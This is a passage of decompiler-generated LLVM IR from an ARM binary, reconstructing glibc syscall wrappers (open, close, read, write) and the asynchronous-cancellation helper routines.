  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.59 to i32), { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_14a14, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1499c, { 1, 0 }
  uselistorder label %dec_label_pc_14980, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14968, { 1, 0 }
}

define i32 @function_14a28(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a28:
  %v0_14a28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a28, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14a28
  %v2_14a28 = load i32, i32* @r4, align 4
  %v4_14a28 = lshr i32 %v2_14a28, %arg1
  %v5_14a28 = sub i32 32, %arg1
  %v6_14a28 = shl i32 %v2_14a28, %v5_14a28
  %v7_14a28 = or i32 %v6_14a28, %v4_14a28
  %v9_14a28 = and i32 %v7_14a28, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14a28, %bb
  %v4_14a30 = phi i32 [ %arg1, %dec_label_pc_14a28 ], [ %v9_14a28, %bb ]
  ret i32 %v4_14a30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_14a44 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14a44, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14a44 = load i32, i32* @r0, align 4
  ret i32 %v2_14a44

bb1:                                              ; preds = %entry
  %v0_14a48 = call i32 @__syscall_error()
  ret i32 %v0_14a48
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a54 = load i32, i32* @global_var_253ec.537, align 4
  %v2_14a58 = icmp eq i32 %v3_14a54, 0
  store i1 %v2_14a58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a58, label %dec_label_pc_14a60, label %entry.dec_label_pc_14a7c_crit_edge

entry.dec_label_pc_14a7c_crit_edge:               ; preds = %entry
  %v3_14a7c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a60:                               ; preds = %entry
  %v0_14a60 = load i32, i32* @r7, align 4
  store i32 %v0_14a60, i32* @ip, align 4
  %v0_14a70 = load i32, i32* @r0, align 4
  %v2_14a70 = icmp ugt i32 %v0_14a70, -4097
  %v7_14a70 = icmp eq i32 %v0_14a70, -4096
  store i1 %v7_14a70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a70, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_14a7c, %dec_label_pc_14a60
  %merge = phi i32 [ %v0_14a70, %dec_label_pc_14a60 ], [ %v0_14aa0, %dec_label_pc_14a7c ], [ %v0_14ab0, %bb8 ], [ %v6_14ac0, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_14a60
  %v0_14a78 = call i32 @__syscall_error()
  br label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %entry.dec_label_pc_14a7c_crit_edge, %bb7
  %v3_14a7c = phi i32 [ %v3_14a7c.pre, %entry.dec_label_pc_14a7c_crit_edge ], [ %v0_14a78, %bb7 ]
  %v9_14a7c = load i32, i32* @r7, align 4
  store i32 %v9_14a7c, i32* %stack_var_-8, align 4
  %v12_14a7c = load i32, i32* @lr, align 4
  %v0_14a80 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14a80, i32* @ip, align 4
  store i32 %v3_14a7c, i32* @r7, align 4
  %v1_14a9c = call i32 @__libc_disable_asynccancel(i32 %v0_14a80)
  %v0_14aa0 = load i32, i32* @r7, align 4
  store i32 %v0_14aa0, i32* @r0, align 4
  %v2_14aa4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14aa4, i32* @r7, align 4
  store i32 %v12_14a7c, i32* @lr, align 4
  %v2_14aa8 = icmp ugt i32 %v0_14aa0, -4097
  %v7_14aa8 = icmp eq i32 %v0_14aa0, -4096
  store i1 %v7_14aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14aa8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_14a7c
  %v0_14ab0 = call i32 @__syscall_error()
  %v0_14ac0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14ac0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_14ac0 = load i32, i32* @r1, align 4
  %v5_14ac0 = mul i32 %v0_14ab0, 262144
  %v6_14ac0 = and i32 %v1_14ac0, %v5_14ac0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14aa0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14a70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a7c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_14ad4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14ad4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14ad4 = load i32, i32* @r0, align 4
  ret i32 %v2_14ad4

bb1:                                              ; preds = %entry
  %v0_14ad8 = call i32 @__syscall_error()
  ret i32 %v0_14ad8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14ae4 = load i32, i32* @global_var_253ec.537, align 4
  %v2_14ae8 = icmp eq i32 %v3_14ae4, 0
  store i1 %v2_14ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ae8, label %dec_label_pc_14af0, label %entry.dec_label_pc_14b0c_crit_edge

entry.dec_label_pc_14b0c_crit_edge:               ; preds = %entry
  %v3_14b0c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14b0c

dec_label_pc_14af0:                               ; preds = %entry
  %v0_14b00 = load i32, i32* @r0, align 4
  %v2_14b00 = icmp ugt i32 %v0_14b00, -4097
  %v7_14b00 = icmp eq i32 %v0_14b00, -4096
  store i1 %v7_14b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b00, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_14b0c, %dec_label_pc_14af0
  %merge = phi i32 [ %v0_14b00, %dec_label_pc_14af0 ], [ %v0_14b30, %dec_label_pc_14b0c ], [ %v0_14b40, %bb10 ], [ %v9_14b50, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14af0
  %v0_14b08 = call i32 @__syscall_error()
  br label %dec_label_pc_14b0c

dec_label_pc_14b0c:                               ; preds = %entry.dec_label_pc_14b0c_crit_edge, %bb9
  %v3_14b0c = phi i32 [ %v3_14b0c.pre, %entry.dec_label_pc_14b0c_crit_edge ], [ %v0_14b08, %bb9 ]
  store i32 %v3_14b0c, i32* %stack_var_-24, align 4
  %v9_14b0c = load i32, i32* @r2, align 4
  %v12_14b0c = load i32, i32* @r3, align 4
  %v15_14b0c = load i32, i32* @r7, align 4
  store i32 %v15_14b0c, i32* %stack_var_-8, align 4
  %v18_14b0c = load i32, i32* @lr, align 4
  %v0_14b10 = call i32 @__libc_enable_asynccancel()
  %v2_14b18 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_14b0c, i32* @r2, align 4
  store i32 %v12_14b0c, i32* @r3, align 4
  store i32 %v2_14b18, i32* @r7, align 4
  %v1_14b2c = call i32 @__libc_disable_asynccancel(i32 %v0_14b10)
  %v0_14b30 = load i32, i32* @r7, align 4
  store i32 %v0_14b30, i32* @r0, align 4
  %v2_14b34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b34, i32* @r7, align 4
  store i32 %v18_14b0c, i32* @lr, align 4
  %v2_14b38 = icmp ugt i32 %v0_14b30, -4097
  %v7_14b38 = icmp eq i32 %v0_14b30, -4096
  store i1 %v7_14b38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b38, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14b0c
  %v0_14b40 = call i32 @__syscall_error()
  %v0_14b50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14b50, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14b50 = load i32, i32* @r1, align 4
  %v3_14b50 = load i32, i32* @r8, align 4
  %v4_14b50 = lshr i32 %v0_14b40, %v3_14b50
  %v5_14b50 = sub i32 32, %v3_14b50
  %v6_14b50 = shl i32 %v0_14b40, %v5_14b50
  %v7_14b50 = or i32 %v6_14b50, %v4_14b50
  %v9_14b50 = and i32 %v7_14b50, %v1_14b50
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14b40, { 2, 1, 0 }
  uselistorder i32 %v0_14b30, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14b00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b0c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_14b64 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14b64, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14b64 = load i32, i32* @r0, align 4
  ret i32 %v2_14b64

bb1:                                              ; preds = %entry
  %v0_14b68 = call i32 @__syscall_error()
  ret i32 %v0_14b68
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b74 = load i32, i32* @global_var_253ec.537, align 4
  %v2_14b78 = icmp eq i32 %v3_14b74, 0
  store i1 %v2_14b78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b78, label %dec_label_pc_14b80, label %entry.dec_label_pc_14b9c_crit_edge

entry.dec_label_pc_14b9c_crit_edge:               ; preds = %entry
  %v3_14b9c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14b9c

dec_label_pc_14b80:                               ; preds = %entry
  %v0_14b90 = load i32, i32* @r0, align 4
  %v2_14b90 = icmp ugt i32 %v0_14b90, -4097
  %v7_14b90 = icmp eq i32 %v0_14b90, -4096
  store i1 %v7_14b90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b90, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_14b9c, %dec_label_pc_14b80
  %merge = phi i32 [ %v0_14b90, %dec_label_pc_14b80 ], [ %v0_14bc0, %dec_label_pc_14b9c ], [ %v0_14bd0, %bb10 ], [ %v8_14be0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14b80
  %v0_14b98 = call i32 @__syscall_error()
  br label %dec_label_pc_14b9c

dec_label_pc_14b9c:                               ; preds = %entry.dec_label_pc_14b9c_crit_edge, %bb9
  %v3_14b9c = phi i32 [ %v3_14b9c.pre, %entry.dec_label_pc_14b9c_crit_edge ], [ %v0_14b98, %bb9 ]
  %v12_14b9c = load i32, i32* @r3, align 4
  %v15_14b9c = load i32, i32* @r7, align 4
  store i32 %v15_14b9c, i32* %stack_var_-8, align 4
  %v18_14b9c = load i32, i32* @lr, align 4
  %v0_14ba0 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_14b9c, i32* @r3, align 4
  store i32 %v3_14b9c, i32* @r7, align 4
  %v1_14bbc = call i32 @__libc_disable_asynccancel(i32 %v0_14ba0)
  %v0_14bc0 = load i32, i32* @r7, align 4
  store i32 %v0_14bc0, i32* @r0, align 4
  %v2_14bc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14bc4, i32* @r7, align 4
  store i32 %v18_14b9c, i32* @lr, align 4
  %v2_14bc8 = icmp ugt i32 %v0_14bc0, -4097
  %v7_14bc8 = icmp eq i32 %v0_14bc0, -4096
  store i1 %v7_14bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bc8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14b9c
  %v0_14bd0 = call i32 @__syscall_error()
  %v0_14be0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14be0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14be0 = load i32, i32* @r1, align 4
  %v3_14be0 = udiv i32 %v0_14bd0, 32768
  %v4_14be0 = mul i32 %v0_14bd0, 131072
  %v5_14be0 = or i32 %v3_14be0, %v4_14be0
  %v8_14be0 = and i32 %v1_14be0, %v5_14be0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14bc0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14b90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b9c, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14bf4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14bf4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14bf4 = load i32, i32* @r0, align 4
  ret i32 %v2_14bf4

bb1:                                              ; preds = %entry
  %v0_14bf8 = call i32 @__syscall_error()
  ret i32 %v0_14bf8

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c04 = load i32, i32* @global_var_253ec.537, align 4
  %v2_14c08 = icmp eq i32 %v3_14c04, 0
  br i1 %v2_14c08, label %dec_label_pc_14c10, label %entry.dec_label_pc_14c2c_crit_edge

entry.dec_label_pc_14c2c_crit_edge:               ; preds = %entry
  %v3_14c2c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14c2c

dec_label_pc_14c10:                               ; preds = %entry
  %v0_14c20 = load i32, i32* @r0, align 4
  %v2_14c20 = icmp ugt i32 %v0_14c20, -4097
  br i1 %v2_14c20, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_14c2c, %dec_label_pc_14c10
  %merge = phi i32 [ %v0_14c20, %dec_label_pc_14c10 ], [ %v0_14c50, %dec_label_pc_14c2c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14c10
  %v0_14c28 = call i32 @__syscall_error()
  br label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %entry.dec_label_pc_14c2c_crit_edge, %bb8
  %v3_14c2c = phi i32 [ %v3_14c2c.pre, %entry.dec_label_pc_14c2c_crit_edge ], [ %v0_14c28, %bb8 ]
  %v6_14c2c = load i32, i32* @r1, align 4
  %v15_14c2c = load i32, i32* @r7, align 4
  store i32 %v15_14c2c, i32* %stack_var_-8, align 4
  %v18_14c2c = load i32, i32* @lr, align 4
  %v0_14c30 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_14c2c, i32* @r1, align 4
  store i32 %v3_14c2c, i32* @r7, align 4
  %v1_14c4c = call i32 @__libc_disable_asynccancel(i32 %v0_14c30)
  %v0_14c50 = load i32, i32* @r7, align 4
  store i32 %v0_14c50, i32* @r0, align 4
  %v2_14c54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c54, i32* @r7, align 4
  store i32 %v18_14c2c, i32* @lr, align 4
  %v2_14c58 = icmp ugt i32 %v0_14c50, -4097
  br i1 %v2_14c58, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_14c2c
  %v0_14c60 = call i32 @__syscall_error()
  ret i32 %v0_14c60

; uselistorder directives
  uselistorder i32 %v0_14c50, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_14c2c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14c70 = load i32, i32* %r0.global-to-local, align 4
  %v1_14c70 = and i32 %v0_14c70, 2
  %v2_14c70 = icmp eq i32 %v1_14c70, 0
  %v3_14c74 = load i32, i32* @r4, align 4
  store i32 %v3_14c74, i32* %stack_var_-16, align 4
  br i1 %v2_14c70, label %dec_label_pc_14c7c, label %dec_label_pc_14cf0

dec_label_pc_14c7c:                               ; preds = %entry
  %v0_14c7c = call i32 @__aeabi_read_tp()
  store i32 %v0_14c7c, i32* %r0.global-to-local, align 4
  %v1_14c80 = add i32 %v0_14c7c, -1036
  %v2_14c80 = inttoptr i32 %v1_14c80 to i32*
  %v3_14c80 = load i32, i32* %v2_14c80, align 4
  %v1_14c84 = add i32 %v0_14c7c, -1168
  store i32 %v1_14c84, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14c88

dec_label_pc_14c88:                               ; preds = %dec_label_pc_14cbc.dec_label_pc_14c88_crit_edge, %dec_label_pc_14c7c
  %v0_14c94 = phi i32 [ %v0_14c94.pre, %dec_label_pc_14cbc.dec_label_pc_14c88_crit_edge ], [ %v1_14c84, %dec_label_pc_14c7c ]
  %v0_14c88 = phi i32 [ %v0_14cbc, %dec_label_pc_14cbc.dec_label_pc_14c88_crit_edge ], [ %v3_14c80, %dec_label_pc_14c7c ]
  %v1_14c88 = and i32 %v0_14c88, -3
  store i32 %v1_14c88, i32* %r7.global-to-local, align 4
  store i32 %v0_14c88, i32* %r4.global-to-local, align 4
  store i32 %v1_14c88, i32* @r1, align 4
  %v1_14c94 = add i32 %v0_14c94, 132
  store i32 %v1_14c94, i32* @r2, align 4
  %v1_14c9823 = inttoptr i32 %v1_14c94 to i32*
  %v2_14c9824 = load i32, i32* %v1_14c9823, align 4
  %v3_14c9c26 = icmp uge i32 %v2_14c9824, %v0_14c88
  store i1 %v3_14c9c26, i1* %cpsr_c.global-to-local, align 1
  %v9_14c9c32 = icmp eq i32 %v2_14c9824, %v0_14c88
  br i1 %v9_14c9c32, label %dec_label_pc_14ca4, label %dec_label_pc_14cbc

dec_label_pc_14ca4:                               ; preds = %dec_label_pc_14c88, %dec_label_pc_14ca4.dec_label_pc_14c98_crit_edge
  %v0_14ca433 = phi i32 [ %v1_14c9c.pre, %dec_label_pc_14ca4.dec_label_pc_14c98_crit_edge ], [ %v0_14c88, %dec_label_pc_14c88 ]
  store i32 %v0_14ca433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14cb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14cb4, label %dec_label_pc_14cb8, label %dec_label_pc_14ca4.dec_label_pc_14c98_crit_edge

dec_label_pc_14ca4.dec_label_pc_14c98_crit_edge:  ; preds = %dec_label_pc_14ca4
  %v0_14c98.pre = load i32, i32* @r2, align 4
  %v1_14c9c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14c98 = inttoptr i32 %v0_14c98.pre to i32*
  %v2_14c98 = load i32, i32* %v1_14c98, align 4
  %v3_14c9c = icmp uge i32 %v2_14c98, %v1_14c9c.pre
  store i1 %v3_14c9c, i1* %cpsr_c.global-to-local, align 1
  %v9_14c9c = icmp eq i32 %v2_14c98, %v1_14c9c.pre
  br i1 %v9_14c9c, label %dec_label_pc_14ca4, label %dec_label_pc_14cbc

dec_label_pc_14cb8:                               ; preds = %dec_label_pc_14ca4
  %v0_14cb8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14cbc

dec_label_pc_14cbc:                               ; preds = %dec_label_pc_14c88, %dec_label_pc_14ca4.dec_label_pc_14c98_crit_edge, %dec_label_pc_14cb8
  %v0_14cbc = phi i32 [ %v0_14cb8, %dec_label_pc_14cb8 ], [ %v2_14c9824, %dec_label_pc_14c88 ], [ %v2_14c98, %dec_label_pc_14ca4.dec_label_pc_14c98_crit_edge ]
  %v1_14cbc = phi i32 [ %v0_14cb8, %dec_label_pc_14cb8 ], [ %v0_14c88, %dec_label_pc_14c88 ], [ %v1_14c9c.pre, %dec_label_pc_14ca4.dec_label_pc_14c98_crit_edge ]
  %v3_14cbc = icmp uge i32 %v0_14cbc, %v1_14cbc
  store i1 %v3_14cbc, i1* %cpsr_c.global-to-local, align 1
  %v9_14cbc = icmp eq i32 %v0_14cbc, %v1_14cbc
  br i1 %v9_14cbc, label %dec_label_pc_14ce4.preheader, label %dec_label_pc_14cbc.dec_label_pc_14c88_crit_edge

dec_label_pc_14cbc.dec_label_pc_14c88_crit_edge:  ; preds = %dec_label_pc_14cbc
  %v0_14c94.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14c88

dec_label_pc_14ce4.preheader:                     ; preds = %dec_label_pc_14cbc
  %v0_14ce41 = load i32, i32* %r7.global-to-local, align 4
  %v1_14ce42 = and i32 %v0_14ce41, 12
  store i32 %v1_14ce42, i32* @r3, align 4
  %v2_14ce83 = icmp ugt i32 %v1_14ce42, 3
  store i1 %v2_14ce83, i1* %cpsr_c.global-to-local, align 1
  %v7_14ce85 = icmp eq i32 %v1_14ce42, 4
  br i1 %v7_14ce85, label %dec_label_pc_14cc8.lr.ph, label %dec_label_pc_14ce4.preheader.dec_label_pc_14cf0.loopexit_crit_edge

dec_label_pc_14ce4.preheader.dec_label_pc_14cf0.loopexit_crit_edge: ; preds = %dec_label_pc_14ce4.preheader
  %v1_14cf4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14cf0.loopexit

dec_label_pc_14cc8.lr.ph:                         ; preds = %dec_label_pc_14ce4.preheader
  %v0_14ccc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_14ccc = add i32 %v0_14ccc.pre, 132
  %v2_14ce0 = inttoptr i32 %v1_14ccc to i32*
  br label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cc8.lr.ph, %dec_label_pc_14cc8
  %v0_14cc8 = phi i32 [ %v0_14ce41, %dec_label_pc_14cc8.lr.ph ], [ %v3_14ce0, %dec_label_pc_14cc8 ]
  store i32 %v0_14cc8, i32* @r2, align 4
  store i32 %v1_14ccc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_14ce0 = load i32, i32* %v2_14ce0, align 4
  store i32 %v3_14ce0, i32* %r7.global-to-local, align 4
  %v1_14ce4 = and i32 %v3_14ce0, 12
  store i32 %v1_14ce4, i32* @r3, align 4
  %v7_14ce8 = icmp eq i32 %v1_14ce4, 4
  br i1 %v7_14ce8, label %dec_label_pc_14cc8, label %dec_label_pc_14ce4.dec_label_pc_14cf0.loopexit_crit_edge

dec_label_pc_14ce4.dec_label_pc_14cf0.loopexit_crit_edge: ; preds = %dec_label_pc_14cc8
  %v2_14ce8 = icmp ugt i32 %v1_14ce4, 3
  store i1 %v2_14ce8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14cf0.loopexit

dec_label_pc_14cf0.loopexit:                      ; preds = %dec_label_pc_14ce4.preheader.dec_label_pc_14cf0.loopexit_crit_edge, %dec_label_pc_14ce4.dec_label_pc_14cf0.loopexit_crit_edge
  %v1_14cf4.pre = phi i32 [ %v1_14cf4.pre.pre, %dec_label_pc_14ce4.preheader.dec_label_pc_14cf0.loopexit_crit_edge ], [ %v1_14ccc, %dec_label_pc_14ce4.dec_label_pc_14cf0.loopexit_crit_edge ]
  %v2_14cf0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14cf0

dec_label_pc_14cf0:                               ; preds = %dec_label_pc_14cf0.loopexit, %entry
  %v1_14cf4 = phi i32 [ %v1_14cf4.pre, %dec_label_pc_14cf0.loopexit ], [ %v0_14c70, %entry ]
  %v2_14cf0 = phi i32 [ %v2_14cf0.pre, %dec_label_pc_14cf0.loopexit ], [ %v3_14c74, %entry ]
  store i32 %v2_14cf0, i32* @r4, align 4
  ret i32 %v1_14cf4

; uselistorder directives
  uselistorder i32 %v3_14ce0, { 1, 2, 0 }
  uselistorder i32 %v1_14ccc, { 0, 2, 1 }
  uselistorder i32 %v0_14cb8, { 1, 0 }
  uselistorder i32 %v1_14c9c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14c88, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_14cf0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14cc8, { 1, 0 }
  uselistorder label %dec_label_pc_14cbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14ca4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14cf8 = load i32, i32* @r4, align 4
  store i32 %v3_14cf8, i32* %stack_var_-24, align 4
  store i32 54464, i32* %r8.global-to-local, align 4
  %v0_14d00 = call i32 @__aeabi_read_tp()
  %v1_14d04 = add i32 %v0_14d00, -1036
  %v2_14d04 = inttoptr i32 %v1_14d04 to i32*
  %v3_14d04 = load i32, i32* %v2_14d04, align 4
  store i32 %v3_14d04, i32* %r6.global-to-local, align 4
  %v1_14d08 = add i32 %v0_14d00, -1168
  store i32 %v1_14d08, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r8.global-to-local, align 4
  %v1_14d1046 = or i32 %v3_14d04, 2
  store i32 %v1_14d1046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d1449 = icmp eq i32 %v1_14d1046, %v3_14d04
  br i1 %v9_14d1449, label %dec_label_pc_14dc0, label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %entry, %bb.dec_label_pc_14d1c_crit_edge
  %v0_14d20 = phi i32 [ %v0_14d20.pre, %bb.dec_label_pc_14d1c_crit_edge ], [ %v1_14d08, %entry ]
  %v1_14d1051 = phi i32 [ %v1_14d10, %bb.dec_label_pc_14d1c_crit_edge ], [ %v1_14d1046, %entry ]
  %v0_14d2450 = phi i32 [ %v1_14d50, %bb.dec_label_pc_14d1c_crit_edge ], [ %v3_14d04, %entry ]
  store i32 %v1_14d1051, i32* @r1, align 4
  %v1_14d20 = add i32 %v0_14d20, 132
  store i32 %v1_14d20, i32* @r2, align 4
  store i32 %v0_14d2450, i32* %r4.global-to-local, align 4
  %v1_14d2834 = inttoptr i32 %v1_14d20 to i32*
  %v2_14d2835 = load i32, i32* %v1_14d2834, align 4
  store i32 %v2_14d2835, i32* @r3, align 4
  %v3_14d2c37 = icmp uge i32 %v2_14d2835, %v0_14d2450
  store i1 %v3_14d2c37, i1* %cpsr_c.global-to-local, align 1
  %v9_14d2c43 = icmp eq i32 %v2_14d2835, %v0_14d2450
  br i1 %v9_14d2c43, label %dec_label_pc_14d34, label %dec_label_pc_14d4c

dec_label_pc_14d34:                               ; preds = %dec_label_pc_14d1c, %dec_label_pc_14d34.dec_label_pc_14d28_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14d44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d44, label %dec_label_pc_14d48, label %dec_label_pc_14d34.dec_label_pc_14d28_crit_edge

dec_label_pc_14d34.dec_label_pc_14d28_crit_edge:  ; preds = %dec_label_pc_14d34
  %v0_14d28.pre = load i32, i32* @r2, align 4
  %v1_14d2c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14d28 = inttoptr i32 %v0_14d28.pre to i32*
  %v2_14d28 = load i32, i32* %v1_14d28, align 4
  store i32 %v2_14d28, i32* @r3, align 4
  %v3_14d2c = icmp uge i32 %v2_14d28, %v1_14d2c.pre
  store i1 %v3_14d2c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d2c = icmp eq i32 %v2_14d28, %v1_14d2c.pre
  br i1 %v9_14d2c, label %dec_label_pc_14d34, label %dec_label_pc_14d4c

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d34
  %v0_14d48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14d48, i32* @r3, align 4
  br label %dec_label_pc_14d4c

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d1c, %dec_label_pc_14d34.dec_label_pc_14d28_crit_edge, %dec_label_pc_14d48
  %v1_14d50 = phi i32 [ %v0_14d48, %dec_label_pc_14d48 ], [ %v2_14d2835, %dec_label_pc_14d1c ], [ %v2_14d28, %dec_label_pc_14d34.dec_label_pc_14d28_crit_edge ]
  %v1_14d4c = load i32, i32* %r6.global-to-local, align 4
  %v3_14d4c = icmp uge i32 %v1_14d50, %v1_14d4c
